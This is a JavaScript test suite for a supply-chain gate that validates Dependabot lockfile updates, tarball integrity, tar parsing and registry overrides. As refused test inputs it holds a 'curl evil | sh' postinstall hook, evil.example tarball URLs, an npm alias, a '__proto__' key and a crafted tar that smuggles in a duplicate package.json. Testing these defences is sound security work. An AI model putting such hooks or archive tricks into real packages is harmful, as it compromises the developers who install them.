  // version differs (also a bundled version change under an unchanged anchor)
  await refusedWith([entry('a', 'a', '1.0.1')], serve(good), /name or version .* differs/);
  // name differs
  await refusedWith([entry('a', 'other', '1.0.0')], serve(good), /name or version .* differs/);
  // its package.json is no JSON object, or larger than the per-file limit
  const notJson = tgz({ 'package/node_modules/a/package.json': '{not json' });
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: sri(notJson) })],
    serve(notJson),
    /package\.json in the bundling tarball is not readable/,
  );
  await refusedWith(ONE, serve(good), /package\.json in the bundling tarball is not readable/, {
    ...BUNDLE_LIMITS,
    maxManifestBytes: 8,
  });
  // sha512 differs: another tarball under the same integrity is not read at all
  const evil = bundlerTgz('bundler', '1.0.0', { a: { name: 'a', version: '1.0.0' } });
  await refusedWith(ONE, serve(evil), /sha512 does not match the lock integrity/);
  // download errors: an error status, a failing fetch (also: a redirect, refused by redirect:'error')
  await refusedWith(ONE, serve('', { status: 404 }), /download failed \(status 404\)/);
  const broken = async () => {
    throw new TypeError('fetch failed');
  };
  await refusedWith(ONE, broken, /download failed$/);
  // too large: announced by content-length, or only while reading the body
  const small = { ...BUNDLE_LIMITS, maxBytes: 64 };
  await refusedWith(
    ONE,
    serve(good, { headers: { 'content-length': String(good.length) } }),
    /larger than the limit/,
    small,
  );
  await refusedWith(ONE, serve(good), /larger than the limit/, small);
  // an announced size over the limit is refused before the body is read (this body never ends)
  const endless = new ReadableStream({ pull: () => new Promise(() => {}) });
  await refusedWith(
    ONE,
    serve(endless, { headers: { 'content-length': String(10 ** 12) } }),
    /larger than the limit/,
    { ...BUNDLE_LIMITS, timeoutMs: 2000 },
  );
  // timeout: a server that never answers
  const hang = (url, { signal }) =>
    new Promise((_, reject) => signal.addEventListener('abort', () => reject(signal.reason)));
  await refusedWith(ONE, hang, /timed out/, { ...BUNDLE_LIMITS, timeoutMs: 50 });
  // ... also one that ignores the abort signal, and a body that stalls after the headers
  await refusedWith(ONE, () => new Promise(() => {}), /timed out/, {
    ...BUNDLE_LIMITS,
    timeoutMs: 50,
  });
  const stalled = new ReadableStream({ pull: () => new Promise(() => {}) });
  await refusedWith(ONE, serve(stalled), /timed out/, { ...BUNDLE_LIMITS, timeoutMs: 50 });
  // a gzip bomb (unpacked size over the limit) and data that is no gzip tar
  await refusedWith(ONE, serve(good), /not a readable gzip tar/, {
    ...BUNDLE_LIMITS,
    maxUnpackedBytes: 1024,
  });
  const junk = Buffer.from('not a tarball');
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: sri(junk) })],
    serve(junk),
    /not a readable gzip tar/,
  );
  // a broken header checksum, and a kept path that occurs twice (extraction lets the last win)
  const raw = tar({ 'package/node_modules/a/package.json': JSON.stringify(content.a) });
  raw[0] ^= 1;
  const badSum = gzipSync(raw);
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: sri(badSum) })],
    serve(badSum),
    /not a readable gzip tar/,
  );
  const twiceData = Buffer.from(JSON.stringify({ name: 'a', version: '6.6.6' }));
  const twice = tgz(
    { 'package/node_modules/a/package.json': JSON.stringify(content.a) },
    {
      extra: [
        tarHeader('package/node_modules/a/package.json', twiceData.length, '0'),
        pad512(twiceData),
      ],
    },
  );
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: sri(twice) })],
    serve(twice),
    /not a readable gzip tar/,
  );
  // the same path after a single zero block: node-tar reads on and lets 6.6.6 win, so a zero
  // block that is not the end of the archive (two zero blocks or EOF) fails closed
  const v1 = tar({ 'package/node_modules/a/package.json': JSON.stringify(content.a) });
  const hidden = Buffer.concat([
    v1.subarray(0, v1.length - 1024),
    Buffer.alloc(512),
    tarHeader('package/node_modules/a/package.json', twiceData.length, '0'),
    pad512(twiceData),
    Buffer.alloc(1024),
  ]);
  assert.throws(() => tarFiles(hidden, () => true), /zero block inside the archive/);
  const hiddenTgz = gzipSync(hidden);
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: sri(hiddenTgz) })],
    serve(hiddenTgz),
    /not a readable gzip tar/,
  );
  // the end of the archive: two zero blocks, or one zero block at the very end
  const oneZero = v1.subarray(0, v1.length - 512);
  assert.equal(tarFiles(oneZero, () => true).size, 1);
  assert.equal(tarFiles(v1, () => true).size, 1);
  // an anchor that is not a registry tarball with sha512 is never downloaded
  const never = serve(good);
  await refusedWith(
    [entry('a', 'a', '1.0.0', { resolved: 'https://evil.example/x.tgz' })],
    never,
    /anchor without a registry tarball/,
  );
  await refusedWith(
    [entry('a', 'a', '1.0.0', { integrity: 'sha1-AAAA' })],
    never,
    /anchor without a registry tarball/,
  );
  assert.equal(never.calls.length, 0);

  // long paths (over 100 bytes): PAX path header, GNU long name, ustar prefix
  for (const longNames of ['pax', 'gnu', 'ustar']) {
    const t = bundlerTgz(
      'bundler',
      '1.0.0',
      { [LONG]: { name: 'y'.repeat(60), version: '1.0.0' } },
      { longNames },
    );
    const e = entry(LONG, 'y'.repeat(60), '1.0.0', { integrity: sri(t) });
    assert.deepEqual(await findings([e], serve(t)), [], longNames);
    assert.match((await findings([{ ...e, version: '1.0.1' }], serve(t)))[0], /differs/, longNames);
  }

  // PAX size and path apply to the next real entry, not to a meta entry in between (here a GNU
  // long name, whose own size is used); the file header's own size field is wrong on purpose
  const paxData = Buffer.from(JSON.stringify(content.a));
  const paxSize = paxRecord('size', String(paxData.length));
  const gnuName = Buffer.from('package/node_modules/a/package.json\0');
  const mixed = gzipSync(
    tar(
      {},
      {
        extra: [
          tarHeader('PaxHeader/a', paxSize.length, 'x'),
          pad512(paxSize),
          tarHeader('././@LongLink', gnuName.length, 'L'),
          pad512(gnuName),
          tarHeader('ignored', 0, '0'),
          pad512(paxData),
        ],
      },
    ),
  );
  assert.deepEqual(
    await findings([entry('a', 'a', '1.0.0', { integrity: sri(mixed) })], serve(mixed)),
    [],
  );

  // the tar reader alone: kept files, a size limit per file, a PAX global path is refused
  const files = tarFiles(gunzipSync(good), (p) => p.endsWith('/package.json'), 1 << 20);
  assert.deepEqual([...files.keys()].sort(), [
    'package/node_modules/@s/b/package.json',
    'package/node_modules/a/node_modules/c/package.json',
    'package/node_modules/a/package.json',
    'package/package.json',
  ]);
  assert.equal(tarFiles(gunzipSync(good), () => true, 1).get('package/package.json'), null);
  const globalPath = paxRecord('path', 'package/node_modules/a/package.json');
  assert.throws(
    () =>
      tarFiles(
        tar(
          {},
          { extra: [tarHeader('pax_global_header', globalPath.length, 'g'), pad512(globalPath)] },
        ),
        () => true,
      ),
    /PAX global header/,
  );
  // the download base: the registry, only the tests' loopback stub as an override
  assert.equal(registryBase({}), 'https://registry.npmjs.org/');
  assert.equal(
    registryBase({ TLDCOST_NPM_REGISTRY: 'http://127.0.0.1:1234' }),
    'http://127.0.0.1:1234/',
  );
  for (const bad of ['https://evil.example', 'http://localhost:1234', 'http://127.0.0.1:1234/x']) {
    assert.equal(registryBase({ TLDCOST_NPM_REGISTRY: bad }), 'https://registry.npmjs.org/', bad);
  }
  // never in CI: GITHUB_ACTIONS=true or any non-empty CI ignores even a loopback override
  const loop = { TLDCOST_NPM_REGISTRY: 'http://127.0.0.1:1234' };
  for (const ci of [
    { GITHUB_ACTIONS: 'true' },
    { CI: 'true' },
    { CI: '1' },
    { GITHUB_ACTIONS: 'true', CI: 'true' },
  ]) {
    assert.equal(
      registryBase({ ...loop, ...ci }),
      'https://registry.npmjs.org/',
      JSON.stringify(ci),
    );
  }
  for (const notCi of [{}, { CI: '' }, { GITHUB_ACTIONS: 'false' }]) {
    assert.equal(
      registryBase({ ...loop, ...notCi }),
      'http://127.0.0.1:1234/',
      JSON.stringify(notCi),
    );
  }
});

/** Loopback stub of the npm registry: serves `files` (URL path -> tarball), records the requests. */
async function registryStub(files) {
  const seen = [];
  const server = createServer((req, res) => {
    seen.push(req.url);
    const body = files[req.url];
    if (!body) {
      res.writeHead(404);
      res.end();
      return;
    }
    res.writeHead(200, {
      'content-type': 'application/octet-stream',
      'content-length': body.length,
    });
    res.end(body);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}`;
  return { url, seen, close: () => new Promise((r) => server.close(r)) };
}

test('the real aws-cdk-lib bump passes the whole exemption against local tarballs; a missing bundle fails', async () => {
  // local tarballs with the bundled package.json files the real lock entries name; the lock's
  // parent integrity is the local tarball's (the real one is 39 MB and not fetched in tests)
  const bundledOf = (pkgs) =>
    Object.fromEntries(
      Object.entries(pkgs)
        .filter(([k]) => k !== CDK_KEY)
        .map(([k, e]) => [
          k.slice(`${CDK_KEY}/node_modules/`.length),
          {
            name: k.slice(k.lastIndexOf('node_modules/') + 'node_modules/'.length),
            version: e.version,
          },
        ]),
    );
  const version = (pkgs) => pkgs[CDK_KEY].version;
  const local = (pkgs, tgzBuf) => ({
    ...pkgs,
    [CDK_KEY]: { ...pkgs[CDK_KEY], integrity: sri(tgzBuf) },
  });
  const before = bundlerTgz('aws-cdk-lib', version(CDK.before), bundledOf(CDK.before));
  const after = bundlerTgz('aws-cdk-lib', version(CDK.after), bundledOf(CDK.after));
  const path = (pkgs) => `/aws-cdk-lib/-/aws-cdk-lib-${version(pkgs)}.tgz`;
  const reg = await registryStub({ [path(CDK.before)]: before, [path(CDK.after)]: after });
  try {
    const r = repo();
    r.commit({ 'package-lock.json': lockWith(local(CDK.before, before)) });
    r.commit({ 'package-lock.json': lockWith(local(CDK.after, after)) });
    // the script runs with an explicit env (PATH plus these, see run()): no GITHUB_ACTIONS or CI
    // reaches it, so the loopback registry applies even when these tests run on GitHub Actions
    const res = await check(r, { extraEnv: { TLDCOST_NPM_REGISTRY: reg.url } });
    assert.equal(res.code, 0, res.out);
    assert.match(res.out, /Dependabot exception: 2 commit\(s\)/);
    // each anchor tarball exactly once (commits are checked newest first)
    assert.deepEqual([...reg.seen].sort(), [path(CDK.before), path(CDK.after)].sort());

    // the new aws-cdk-lib tarball without minimatch: the lock's bundled minimatch is refused
    const rest = Object.fromEntries(
      Object.entries(bundledOf(CDK.after)).filter(([rel]) => rel !== 'minimatch'),
    );
    const without = bundlerTgz('aws-cdk-lib', version(CDK.after), rest);
    const reg2 = await registryStub({ [path(CDK.after)]: without });
    try {
      const r2 = repo();
      r2.commit({ 'package-lock.json': lockWith(local(CDK.after, without)) });
      const res2 = await check(r2, { extraEnv: { TLDCOST_NPM_REGISTRY: reg2.url } });
      assert.equal(res2.code, 1, res2.out);
      assert.match(
        res2.out,
        /bundled node_modules\/aws-cdk-lib\/node_modules\/minimatch: not in the tarball of the package that bundles it/,
      );
      assert.ok(!res2.out.includes(TOKEN));
    } finally {
      await reg2.close();
    }

    // the anchor changes, and its new tarball lacks yaml, a bundled entry the bump did NOT
    // change: still refused, because every bundled entry under a changed anchor is checked
    assert.ok(sameEntry(CDK.before[BUNDLED_IN('yaml')], CDK.after[BUNDLED_IN('yaml')]));
    const noYaml = bundlerTgz(
      'aws-cdk-lib',
      version(CDK.after),
      Object.fromEntries(Object.entries(bundledOf(CDK.after)).filter(([rel]) => rel !== 'yaml')),
    );
    const reg3 = await registryStub({ [path(CDK.before)]: before, [path(CDK.after)]: noYaml });
    try {
      const r3 = repo();
      r3.commit({ 'package-lock.json': lockWith(local(CDK.before, before)) });
      r3.commit({ 'package-lock.json': lockWith(local(CDK.after, noYaml)) });
      const res3 = await check(r3, { extraEnv: { TLDCOST_NPM_REGISTRY: reg3.url } });
      assert.equal(res3.code, 1, res3.out);
      assert.match(
        res3.out,
        /bundled node_modules\/aws-cdk-lib\/node_modules\/yaml: not in the tarball of the package that bundles it/,
      );
      assert.equal(res3.out.match(/: not in the tarball/g).length, 1);
    } finally {
      await reg3.close();
    }
  } finally {
    await reg.close();
  }
});

test('positive: lock-only resolution updates (direct and transitive) of the root lock and tools/lhci pass', async () => {
  const r = repo();
  // root lock alone: left-pad 1.0.0 -> 1.3.0 inside the unchanged range ^1.0.0
  r.commit({ 'package-lock.json': lockWith(bumpedLeftPad) });
  // tools/lhci lock alone: the transitive chain, a major included, package.json unchanged
  r.commit({ 'tools/lhci/package-lock.json': lhciLockWith(LHCI_BUMP) });
  // tools/lhci direct bump: its package.json and its lock together
  r.commit({
    'tools/lhci/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }),
    'tools/lhci/package-lock.json': lhciLockWith({
      ...LHCI_BUMP,
      '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.2', {
        dependencies: { 'proxy-agent': '^8.0.3' },
      }),
    }),
  });
  // root lock alone: packages in workspace directories and nested node_modules
  r.commit({
    'package-lock.json': lockWith({
      ...bumpedLeftPad,
      'site/node_modules/a': reg('a', '1.0.0'),
      'packages/core/node_modules/@s/p': reg('@s/p', '2.0.0'),
      'node_modules/left-pad/node_modules/b': reg('b', '3.0.0'),
    }),
  });
  const res = await check(r);
  assert.equal(res.code, 0, res.out);
  assert.match(res.out, /Dependabot exception: 4 commit\(s\)/);
  assert.equal(res.seen.length, 4);
  assert.ok(!res.out.includes(TOKEN));
});

test('refused: tools/lhci lock – foreign URL, wrong package, alias, sha1 or bad integrity', async () => {
  const re = /tools\/lhci\/package-lock.json: an added or changed package without its own registry/;
  for (const entry of [
    // a foreign registry URL
    { ...reg('basic-ftp', '6.2.6'), resolved: 'https://evil.example/basic-ftp-6.2.6.tgz' },
    // a mirror that is not registry.npmjs.org
    {
      ...reg('basic-ftp', '6.2.6'),
      resolved: 'https://registry.yarnpkg.com/basic-ftp/-/basic-ftp-6.2.6.tgz',
    },
    // right host, wrong package
    { ...reg('basic-ftp', '6.2.6'), resolved: `${REG}/evil-pkg/-/evil-pkg-6.2.6.tgz` },
    // an npm alias (npm:evil-pkg@1.0.0 installed under the name basic-ftp)
    { ...reg('evil-pkg', '1.0.0'), name: 'evil-pkg' },
    // sha1, a malformed sha512, no integrity
    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha1-AAAA' },
    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha512-not base64!' },
    { ...reg('basic-ftp', '6.2.6'), integrity: undefined },
  ]) {
    await refused(
      {
        'tools/lhci/package-lock.json': lhciLockWith({
          ...LHCI_BUMP,
          'node_modules/basic-ftp': entry,
        }),
      },
      re,
    );
  }
  await refused(
    {
      'tools/lhci/package.json': json({
        ...LHCI,
        devDependencies: { '@lhci/cli': 'npm:evil-pkg@1.0.0' },
      }),
    },
    /tools\/lhci\/package.json: devDependencies changed beyond the version/,
  );
  await refused(
    { 'tools/lhci/package.json': json({ ...LHCI, scripts: { postinstall: 'curl evil | sh' } }) },
    /tools\/lhci\/package.json: a top-level field was added or removed/,
  );
});

test('refused: lock-only change of a root, workspace or link entry (no package.json change)', async () => {
  const re = /changed without a package.json change, and a root, workspace or link entry changed/;
  // root lock: the root entry's spec, a workspace entry, a removed or added link
  await refused(
    {
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
      }),
    },
    re,
  );
  await refused(
    {
      'package-lock.json': lockWith({
        site: { name: 'site', dependencies: { astro: '5.1.2' } },
      }),
    },
    re,
  );
  const noLink = { ...LOCK.packages };
  delete noLink['node_modules/site'];
  await refused({ 'package-lock.json': json({ ...LOCK, packages: noLink }) }, re);
  await refused(
    {
      'package-lock.json': lockWith({
        'node_modules/core': { resolved: 'packages/core', link: true },
      }),
    },
    re,
  );
  // tools/lhci lock: its root entry's spec
  await refused(
    {
      'tools/lhci/package-lock.json': lhciLockWith({
        ...LHCI_BUMP,
        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      }),
    },
    new RegExp(`tools/lhci/package-lock.json ${re.source}`),
  );
  // a tools/lhci package.json change does not pair with the root lock
  await refused(
    {
      'tools/lhci/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }),
      'package-lock.json': lockWith({
        ...bumpedLeftPad,
        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
      }),
    },
    re,
  );
  // a root package.json change does not pair with the tools/lhci lock
  await refused(
    {
      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
      'tools/lhci/package-lock.json': lhciLockWith({
        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
      }),
    },
    re,
  );
});

test('refused: package keys of another shape (with or without a package.json change)', async () => {
  const shape =
    /an added or changed key that is not node_modules\/<name> at the root or in a workspace/;
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  for (const key of [
    'xnode_modules/a',
    'docs/node_modules/a',
    'packages/core/x/node_modules/a',
    'node_modules/a/b',
    'node_modules/a/node_modules/',
  ]) {
    await refused({ ...bump, 'package-lock.json': lockWith({ [key]: reg('a', '1.0.0') }) }, shape);
    await refused({ 'package-lock.json': lockWith({ [key]: reg('a', '1.0.0') }) }, shape);
  }
  // a standalone lock has no workspace directories
  await refused(
    { 'tools/lhci/package-lock.json': lhciLockWith({ 'site/node_modules/a': reg('a', '1.0.0') }) },
    new RegExp(`tools/lhci/package-lock.json: ${shape.source}`),
  );
});

test('refused: an own "__proto__" key in the lock, with a package.json change', async () => {
  const bump = { 'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }) };
  const proto = JSON.parse('{"__proto__": {}}');
  await refused(
    { ...bump, 'package-lock.json': lockWith({ ...bumpedLeftPad, ...proto }) },
    /a root or workspace entry was added/,
  );
});

test('refused: lockfiles outside the list, added or deleted lockfiles', async () => {
  const outside = /a file outside the manifests and workflow pins/;
  await refused({ 'tools/other/package-lock.json': lhciLockWith(LHCI_BUMP) }, outside);
  await refused(
    { 'tools/other/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }) },
    outside,
  );
  await refused(
    { 'tools/lhci/sub/package-lock.json': lhciLockWith(LHCI_BUMP) },
    /only modified files allowed \(status A\)/,
  );
  await refused(
    { 'tools/lhci/npm-shrinkwrap.json': lhciLockWith(LHCI_BUMP) },
    /only modified files allowed \(status A\)/,
  );
  await refused(
    { 'tools/lhci/package-lock.json': null },
    /only modified files allowed \(status D\)/,
  );
  await refused({ 'package-lock.json': null }, /only modified files allowed \(status D\)/);
});

test('helpers: pin lines, pairing, diff parsing, manifests, versions, lock, API base', () => {
  assert.ok(PIN_LINE.test(`      - uses: actions/checkout@${SHA_A} # v7.0.1`));
  assert.ok(PIN_LINE.test(`    uses: org/repo/.github/workflows/x.yml@${SHA_B}`));
  assert.ok(!PIN_LINE.test('      - uses: actions/checkout@v7'));
  assert.ok(!PIN_LINE.test(`      - uses: actions/checkout@${SHA_A}; echo x`));
  // pairing: same line up to sha and comment
  const hunk = (rem, add) =>
    `diff --git a/f b/f\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-${rem}\n+${add}\n`;
  const pin = (repoName, sha, c = '') => `      - uses: ${repoName}@${sha}${c}`;
  assert.ok(pinOnlyDiff(hunk(pin('a/b', SHA_A, ' # v1'), pin('a/b', SHA_B, ' # v2'))));
  assert.ok(!pinOnlyDiff(hunk(pin('a/b', SHA_A), pin('a/c', SHA_B))));
  assert.ok(!pinOnlyDiff(hunk(pin('a/b', SHA_A), `  ${pin('a/b', SHA_B)}`)));
  assert.ok(!pinOnlyDiff(`@@ -1,0 +2 @@\n+${pin('a/b', SHA_B)}\n`));
  assert.ok(!pinOnlyDiff(''));
  // a content line that starts with "++"/"--" is content, not a header; "\ No newline" is skipped
  assert.deepEqual(
    diffHunks('--- a/f\n+++ b/f\n@@ -1 +1 @@\n-++ x\n+-- y\n\\ No newline at end of file\n'),
    [{ removed: ['++ x'], added: ['-- y'] }],
  );
  const m = manifestMatcher(['packages/*', 'site']);
  for (const p of ['package.json', 'packages/core/package.json', 'site/package.json']) {
    assert.ok(m(p), p);
  }
  for (const p of [
    'package-lock.json',
    'packages/core/src/x.ts',
    'packages/a/b/package.json',
    'other/package.json',
  ]) {
    assert.ok(!m(p), p);
  }
  for (const v of ['1.2.3', '^1.2.3', '~1.2', '>=1.2.3', '1.2.3-rc.1', '5']) {
    assert.ok(VERSION_SPEC.test(v), v);
  }
  for (const v of ['latest', '*', 'github:a/b', 'file:x', 'npm:a@1', '1.2.3 || evil']) {
    assert.ok(!VERSION_SPEC.test(v), v);
  }
  for (const v of ['1.2.3', '1.2.3-rc.1', '1.2.3+build.5']) assert.ok(LOCK_VERSION.test(v), v);
  for (const v of ['1/../x', '1.2', '1.2.3-', '1.2.3-a..b', '1.2.3/x']) {
    assert.ok(!LOCK_VERSION.test(v), v);
  }
  for (const n of ['react', '@types/node', 'lodash.merge', 'a-b~c'])
    assert.ok(PACKAGE_NAME.test(n), n);
  for (const n of ['..', '.hidden', '_x', '@s/..', '@./x', 'A', 'a/b']) {
    assert.ok(!PACKAGE_NAME.test(n), n);
  }
  assert.equal(
    packageJsonFinding('{"dependencies":{"a":"1.0.0"}}', '{"dependencies":{"a":"1.0.1"}}'),
    '',
  );
  assert.match(packageJsonFinding('not json', '{}'), /not valid JSON/);
  assert.equal(packageLockFinding(json(LOCK), lockWith(bumpedLeftPad)), '');
  // scoped and nested entries
  const scoped = {
    'node_modules/@types/node': {
      version: '22.1.0',
      resolved: `${REG}/@types/node/-/node-22.1.0.tgz`,
      integrity: 'sha512-DDDD',
    },
    'node_modules/a/node_modules/left-pad': {
      version: '1.1.0',
      resolved: `${REG}/left-pad/-/left-pad-1.1.0.tgz`,
      integrity: 'sha512-EEEE',
    },
  };
  assert.equal(packageLockFinding(json(LOCK), lockWith(scoped)), '');
  assert.match(
    packageLockFinding(
      json(LOCK),
      lockWith({
        'node_modules/@types/node': {
          version: '22.1.0',
          resolved: `${REG}/@evil/node/-/node-22.1.0.tgz`,
          integrity: 'sha512-DDDD',
        },
      }),
    ),
    /own registry.npmjs.org tarball/,
  );
  for (const bad of [
    'https://evil.example',
    'http://localhost:1234',
    'http://127.0.0.1.evil.example:80',
    'http://127.0.0.1:1234/x',
    'http://127.0.0.1',
  ]) {
    assert.equal(apiBase({ TLDCOST_GITHUB_API: bad }), 'https://api.github.com', bad);
  }
  assert.equal(apiBase({ TLDCOST_GITHUB_API: 'http://127.0.0.1:1234' }), 'http://127.0.0.1:1234');
  assert.equal(apiBase({}), 'https://api.github.com');
  // standalone locks: exactly the listed paths
  assert.deepEqual(STANDALONE_LOCK_DIRS, ['tools/lhci']);
  assert.equal(lockDir('package-lock.json'), '');
  assert.equal(lockDir('tools/lhci/package-lock.json'), 'tools/lhci');
  for (const p of [
    'tools/other/package-lock.json',
    'tools/lhci/sub/package-lock.json',
    'x/tools/lhci/package-lock.json',
    'tools/lhci/package-lock.json.bak',
    'site/package-lock.json',
  ]) {
    assert.equal(lockDir(p), null, p);
  }
  assert.equal(standaloneManifestDir('tools/lhci/package.json'), 'tools/lhci');
  assert.equal(standaloneManifestDir('tools/other/package.json'), null);
  assert.equal(standaloneManifestDir('package.json'), null);
  // lock-only: only node_modules entries (no links) may change
  assert.equal(lockOnlyFinding(json(LHCI_LOCK), lhciLockWith(LHCI_BUMP)), '');
  assert.equal(lockOnlyFinding(json(LOCK), lockWith(bumpedLeftPad)), '');
  assert.match(
    lockOnlyFinding(json(LOCK), lockWith({ '': { ...LOCK.packages[''], private: true } })),
    /root, workspace or link entry changed/,
  );
  assert.match(lockOnlyFinding('not json', '{}'), /not valid JSON/);
  // a non-package key counts as direct: it must stay byte-identical
  assert.match(
    lockOnlyFinding(json(LOCK), lockWith({ 'docs/node_modules/a': reg('a', '1.0.0') })),
    /root, workspace or link entry changed/,
  );
  // package keys: root or a workspace directory, names per segment
  const k = packageKeyMatcher(['packages/*', 'site']);
  for (const key of [
    'node_modules/a',
    'node_modules/@s/p',
    'node_modules/a/node_modules/@s/p',
    'site/node_modules/a',
    'packages/core/node_modules/a/node_modules/b',
  ]) {
    assert.ok(k(key), key);
  }
  for (const key of [
    '',
    'site',
    'xnode_modules/a',
    'docs/node_modules/a',
    'packages/node_modules/a',
    'packages/core/x/node_modules/a',
    'node_modules/a/b',
    'node_modules/../a',
    'node_modules/a/node_modules/',
    'node_modules/@s/p/q',
  ]) {
    assert.ok(!k(key), key);
  }
  assert.ok(!packageKeyMatcher()('site/node_modules/a'));
  // __proto__: an own key is an added entry, not Object.prototype
  const protoLock = json({
    ...LOCK,
    packages: { ...LOCK.packages, ...JSON.parse('{"__proto__": {}}') },
  });
  assert.ok(protoLock.includes('"__proto__"'));
  assert.match(packageLockFinding(json(LOCK), protoLock), /a root or workspace entry was added/);
});
